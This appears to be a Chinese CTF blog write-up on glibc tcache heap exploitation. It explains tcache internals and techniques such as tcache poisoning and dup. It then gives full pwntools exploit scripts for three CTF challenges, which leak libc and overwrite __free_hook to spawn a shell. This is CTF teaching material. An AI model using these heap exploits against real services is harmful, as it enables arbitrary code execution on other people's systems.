@@ -1,0 +1,493 @@
+---
+layout: post
+title:  "2019.04.17 pwn中tcache的利用"
+tags: [writeup, pwn, heap, ctf, tcache]
+date: 2019-04-17
+comments: false
+---
+
+# tcache in pwn
+
+# **tcache make it easy!**
+
+##### glibc2.26之后加入了tcache机制，
+
+简单来说类似fastbin，
+malloc和free都会先考虑tcache中的chunk。
+提高内存管理效率的同时，安全性有所下降.      
+
+每个thread都会维护一个tcache_prethread_struct结构体(第一次malloc时会先malloc一块内存来存放它)。
+
+tcache_prethread_struct中包含counts，entries。
+
+counts为对应size上的tcache链上的chunk的个数，默认最多7个。
+
+entries用于链接chunk结构体，通过一个单向链表实现。其中的next指针指向下一个大小相同的chunk(指向user data而不是header)  
+
+tcache为空时。
+
+![5cb72f8de5932](https://i.loli.net/2019/04/17/5cb72f8de5932.png)
+
+存入两个chunk时：
+
+![5cb7568b095b7](https://i.loli.net/2019/04/18/5cb7568b095b7.png)
+
+![5cb755d9ecade](https://i.loli.net/2019/04/18/5cb755d9ecade.png)
+
+![5cb755e23eabd](https://i.loli.net/2019/04/18/5cb755e23eabd.png)
+
+![5cb75611a4e4d](https://i.loli.net/2019/04/18/5cb75611a4e4d.png)
+
+free时，如果size < smallbin size:
+
+1. 会被放到对应size的tcache中，每个tcache默认最多储存7个.
+
+2. tcache存满之后，free便会存到fastbin或者unsortedbin.
+
+3. 被放入tcache的chunk不会取消其nextchunk的inuse bit，不会被合并。
+
+malloc时，且size在tcache范围内。
+
+1. 先从tcache中取chunk，遵循FILO原则。直到对应size的tcache为空后才会从bin中找。
+
+2. tcache为空时，如果fastbin/smallbin/unsorted bin中有符合size的chunk，会先把它们放到tcache中，直到tcache满，然后再从tcache中取。因此chunk在bin中和tcache中的顺序相反。
+
+---
+
+# how to exploit it
+
+### tcache poisoning
+
+覆盖 tcache 中的 next，无需构造fakechunk，即可实现arbitrarily alloc.  
+
+### tcache dup
+
+类似fastbin double free，但是由于tcache检查松。可以直接连续free两块内存而不会trigger double   free。同样无需构造fakechunk。  
+
+### tcache house of spirit
+
+简化版house of spirit。只需伪造一个size区域，然后将伪造的fakechunk释放，再次malloc相应大小就可以得到fake_chunk。  
+
+### tcache perthread corruption
+
+tcache_prethread_struct是存在堆上的。如果能直接通过一些手段改写tcache_prethread_struct的内容，便可以控制了malloc的地址，从而达到arbitrarily alloc。  
+
+由于它是存在堆上的，所以有很多种情况可以利用，如House of Force , partial overwrite等
+
+references:
+[m4x](http://m4x.fun/post/dive-into-tcache/)
+[how2heap](https://github.com/shellphish/how2heap)  
+
+---
+
+# examples
+
+记录一些相关题目
+
+## lctf2018 easy_heap
+
+off-by-null,chunk overlapping,tcache dup
+
+checksec:
+
+![5cb745ef22b07](https://i.loli.net/2019/04/17/5cb745ef22b07.png)
+
+main:
+
+![5cb745c517527](https://i.loli.net/2019/04/17/5cb745c517527.png)  
+
+开始时会先calloc一段内存，用来储存下面malloc的一些指针，长度等数据。
+
+大概是这个样子。上面是tcache_prethread_struct区域。下面是add出的的两片区域。  
+
+![5cb746a8a8b2e](https://i.loli.net/2019/04/17/5cb746a8a8b2e.png)
+
+add功能:  
+
+![5cb7476b92d78](https://i.loli.net/2019/04/17/5cb7476b92d78.png)  
+
+限制了最多能add10块区域，每次大小固定为0xf8，之后会请求输入，能输入的最大长度为0xf8。
+
+myread函数，遇到`\x00`会被截断，但仍然会在输入的长度的末尾添加一个`\x00`,存在off-by-null。
+
+![5cb74853c689d](https://i.loli.net/2019/04/17/5cb74853c689d.png)
+
+由于结尾会被添加`\x00`,所以不能通过构造一个unsorted bin然后malloc再view利用fd来泄露libc了。
+
+但是可以通过off-by-null来进行向前合并，让一个大unsorted bin中存在已经分配出去了的chunk，再malloc，利用unsorted bin分割后留下的fd bk来泄露。  
+
+还有一个问题，虽然可以off-by-null将inuse bit位给盖掉，但题目所add出来的chunk大小都为0xf0,加上header大小正好为0x100，然而当我们构造presize的时候`\x00 \x01 \x00 \x00`在第一个`\x00` 处就已经被截断了。因此无法构造出正确的presize。这一点可以通过unsorted bin free时遗留下来的presize区域来绕过。  
+
+首先创建10个chunk，当free掉7个chunk时，tcache已经满了，这时还剩下3个chunk，接着free会将它们放入unsorted bin。当我们将其依次释放之后，便会产生遗留的presize了。
+
+![5cb74c758fb1e](https://i.loli.net/2019/04/17/5cb74c758fb1e.png)
+
+如上图，从上到下依次为chunk1 2 3 4，
+
+chunk3的presize为0x200，因此我们可以通过chunk2来盖掉chunk 3的inuse bit，把chunk1也放入unsorted bin，这样free chunk3时就会把chunk1 2 3合并为一个大的unsorted bin,但这时chunk2仍然是在使用的，再malloc一次，让大unsorted bin分割，新的fd bk值会出现在chunk2的user data区域，view chunk2即可泄露libc。
+
+chunk4是为了防止free 3时其与top chunk合并，因为后续top chunk分割出来之后不会出现新的fd bk。
+
+泄露libc之后，便可以再malloc一次，将剩下的unsorted bin分割，这时分割出去的恰好是之前chunk2的位置，此时有两个指针同时指向了chunk2，可以使用tcache dup来进行arbitrary alloc，覆写freehook为onegadget，free一次拿到shell。(这里覆写mallochook为onegadget后在malloc，程序直接EOF掉了。怀疑是参数问题?)
+
+需要注意的是，在进行tcache dup时要保证del两次之后对应的`counts >= 3`，不然最后一次malloc不会使用tcache进行分配。
+
+exp:
+
+```python
+from pwn import *
+
+io = process('./easy_heap')
+
+#context.log_level = 'debug'
+#context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+
+def debug():
+    #print proc.pidof(io)[0]
+    gdb.attach(io)#proc.pidof(io)[0])#,'''q''')
+    io.interactive()
+
+def add(content):
+    io.sendafter('> ','1')
+    io.sendafter('> ',str(len(content)))
+    io.sendlineafter('> ',content)
+
+def ddel(idx):
+    io.sendafter('> ','2')
+    io.sendafter('> ',str(idx))
+
+def view(idx):
+    io.sendafter('> ','3')
+    io.sendafter('> ',str(idx))
+
+for x in range(10):
+    add(str(x)*0x10)
+
+
+ddel(9) # add last chunk to tcache.prevent consolidate with top chunk
+
+
+
+for x in range(9):
+    ddel(x)
+
+
+for x in range(10):
+    add('a')
+
+for x in range(6):
+    ddel(x)
+
+
+
+ddel(8) # tcache full
+ddel(7) #unsorted bin
+
+add('a'*0xf0+p64(0)) #0 off-by-null
+
+
+ddel(6) #tcache full
+
+ddel(9) #backward consolidate
+
+
+for x in range(7):
+    add('b')
+
+add('c') # split unsorted bin so fd bk appears at #0 user data section
+
+offset = 0x3ebca0
+view(0)
+io.recvuntil('index \n> ')
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - offset
+success('libcbase: '+hex(libcbase))
+#io.interactive()
+onegad = libcbase + 0x4f322
+freehook = libcbase + 0x3ed8e8
+mallochook = libcbase + 0x3ebc30
+success('one_gadget : '+hex(onegad))
+success('free_hook : '+hex(freehook))
+success('malloc_hook : '+hex(mallochook))
+
+add('d') #0 9 , tcache dup
+
+ddel(2) # counts = 3
+
+
+ddel(0)
+ddel(9)
+
+add(p64(freehook))
+add('')
+add(p64(onegad))
+
+
+ddel(2) # trigger free
+
+
+
+io.interactive()
+#debug()
+```
+
+---
+
+## HITB-QUALS-2018 gundam
+
+checksec:
+
+![5cb81111ea773](https://i.loli.net/2019/04/18/5cb81111ea773.png)
+
+main:
+
+![5cb8117739a2b](https://i.loli.net/2019/04/18/5cb8117739a2b.png)
+
+add:
+
+![5cb8119acd11c](https://i.loli.net/2019/04/18/5cb8119acd11c.png)
+
+最多添加9个gundam，添加时会先添加gundam头，其中包含gundam是否被删除，指向gundam内容的指针，gundam类型。gundam头与ptr的内容如下图：
+
+![5cb81225e2e32](https://i.loli.net/2019/04/18/5cb81225e2e32.png)
+
+![5cb8122cdf931](https://i.loli.net/2019/04/18/5cb8122cdf931.png)
+
+delone:
+
+![5cb813220f4aa](https://i.loli.net/2019/04/18/5cb813220f4aa.png)
+
+delall:
+
+![5cb8134b37dd0](https://i.loli.net/2019/04/18/5cb8134b37dd0.png)
+
+show:
+
+![5cb8137891192](https://i.loli.net/2019/04/18/5cb8137891192.png)
+
+add时并没有在输入结尾加\x00，因此可以通过unsorted bin泄露libc。
+
+再利用tcache dup覆写freehook。
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年04月06日 星期六 00时11分48秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = process('./gundam')#,env={'LD_PRELOAD':'./libc.so.6'})
+#io = process('./gundam')
+libc = ELF('./libc.so.6')
+context.log_level = 'debug'
+#context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+def debug():
+    gdb.attach(io)
+    io.interactive()
+def build(name,typ=1):
+    io.sendafter(': ','1')
+    io.sendlineafter(':',name)
+    io.sendlineafter(' :',str(typ))
+
+def visit():
+    io.sendafter(': ','2')
+
+def delgundam(idx):
+    io.sendlineafter(': ','3')
+    io.sendlineafter(':',str(idx))
+
+def delall():
+    io.sendafter(': ','4')
+
+for x in range(9):
+    build('aaa')
+for x in range(9):
+    delgundam(x) #fill tcache and summon unsorted bin
+
+delall()
+
+
+for x in range(7): #use tcache
+
+    build('bbb')
+build('AAAAAAA') #splited from unsorted bin so it have fd bk
+
+
+visit()
+offset = 0x3ebca0
+io.recvuntil('AAAAAAA\n')
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - offset
+success('libcbase : '+hex(libcbase))
+onegadget = libcbase +0x4f322
+mallochook = libcbase + 0x3ebc30
+freehook = libcbase + 0x3ed8e8
+
+#delgundam(2)
+
+#delgundam(3)
+#delgundam(3)
+
+for x in range(9): #clear all
+
+    delgundam(x)
+delall()
+
+
+build('0') #0
+build('1') #1
+
+
+
+delgundam(1) #tcache dup
+
+delgundam(1)
+build(p64(freehook))
+build('a')
+build(p64(onegadget))
+
+delall()
+io.interactive()
+#debug()
+```
+
+
+
+---
+
+## 2019 CISCN 全国大学生信息安全竞赛 BMS
+
+这题远程glibc版本通过double free测出来 >= 2.26
+
+checksec:
+
+![5cbf2b300d055](https://i.loli.net/2019/04/23/5cbf2b300d055.png)
+
+![5cbf2bd1c02c1](https://i.loli.net/2019/04/23/5cbf2bd1c02c1.png)
+
+
+
+login()是个简单的逆向。逆出来登陆名`admin`,密码`frame`
+
+del处有一个uaf.
+
+![5cbf2d22b0f46](https://i.loli.net/2019/04/23/5cbf2d22b0f46.png)
+
+程序没有类似viewbook的功能。
+
+利用tcache的特性，可以通过修改_IO\_2\_1\_stdout\_来泄露libc。
+
+_IO\_2\_1\_stdout\_指针存在bss段上。
+
+![5cbf319b5ecc6](https://i.loli.net/2019/04/23/5cbf319b5ecc6.png)
+
+![5cbf31ad93113](https://i.loli.net/2019/04/23/5cbf31ad93113.png)
+
+![5cbf31be2e1c4](https://i.loli.net/2019/04/23/5cbf31be2e1c4.png)
+
+通过修改其writebase指针为想要读的地址，下次调用puts等函数就会读取其中的内容。
+
+如何修改到呢？
+
+先tcache dup将堆块建立到0x602020的位置(注意不要破坏原有的_IO\_2\_1\_stdout\_指针)，此时tcache链上下一个chunk的位置会变成_IO\_2\_1\_stdout\_的地址。
+
+再次malloc相同大小的chunk，即可返回_IO\_2\_1\_stdout\_。
+
+在这之后，对应的tcache链就已经被破坏，如下图。原因是对应fd位置的内存无效。后续分配chunk就不能再分配0x60大小。
+
+![5cbf3030ef75f](https://i.loli.net/2019/04/23/5cbf3030ef75f.png)
+
+得到_IO\_2\_1\_stdout\_后，为了绕过检测，将其flag设置为`0xfbad1800`。
+
+然后覆盖writebase的低8bit即可。这里覆盖它为`\x90`，就可以打印出`0x7fc1592a9790`上的值，从而泄露libc。
+
+![5cbf327602aa5](https://i.loli.net/2019/04/23/5cbf327602aa5.png)
+
+泄露之后tcache dup改freehook即可。
+
+
+
+exploit:
+
+```python
+#!/usr/bin/env python
+# -*- coding=utf8 -*-
+"""
+# Author: le3d1ng
+# Created Time : 2019年04月21日 星期日 12时23分29秒
+# File Name: exp.py
+# Description:
+"""
+from pwn import *
+
+io = process('./pwn')
+elf = ELF('./pwn')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+context.log_level = 'debug'
+#context.terminal = ['terminator' , '-x' , 'sh' , '-c']
+
+io.recv()
+io.sendline('admin')
+io.recv()
+payload = 'frame'
+io.sendline(payload)
+#io.recv()
+
+
+def debug():
+	gdb.attach(io)
+	io.interactive()
+
+def addbook(name,size,content):
+	io.sendafter('>','1')
+	io.sendafter('name:',name)
+	io.sendafter('size:',str(size))
+	io.sendafter('ion:',content)
+
+def delbook(idx):
+	io.sendafter('>','2')
+	io.sendafter(':',str(idx))
+
+addbook('bbbbbbba',0x60,'bbbbbbbb')
+
+delbook(0)
+delbook(0)
+#debug()
+addbook('aaa',0x60,p64(0x602020))
+addbook('bbb',0x60,'bbb')
+addbook('ccc',0x60,'\x60')
+addbook('ddd',0x60,p64(0xfbad1800) + p64(0)*3 + '\x90')
+#debug()
+offset = 0x3ec7e3
+libcbase = u64(io.recv(6).ljust(8,'\x00')) - offset
+success('libcbase : '+hex(libcbase))
+mallochook = libcbase + 0x3ebc30
+freehook = libcbase + 0x3ed8e8
+onegad = libcbase + 0x4f322
+sysaddr = libcbase + libc.symbols['system']
+
+io.recv()
+#addbook('555',0x80,'aaa')
+io.send('1') #5
+io.sendafter('name:','5')
+io.sendafter('size:',str(0x80))
+io.sendafter('ion:','aa')
+#io.recv()
+#addbook('5',0x60,'aa')
+
+delbook(5)
+delbook(5)
+
+addbook('a',0x80,p64(freehook)) #6
+addbook('a',0x80,'/bin/sh\x00') #7
+addbook('a',0x80,p64(sysaddr))
+delbook(7)
+io.interactive()
+```
+
+
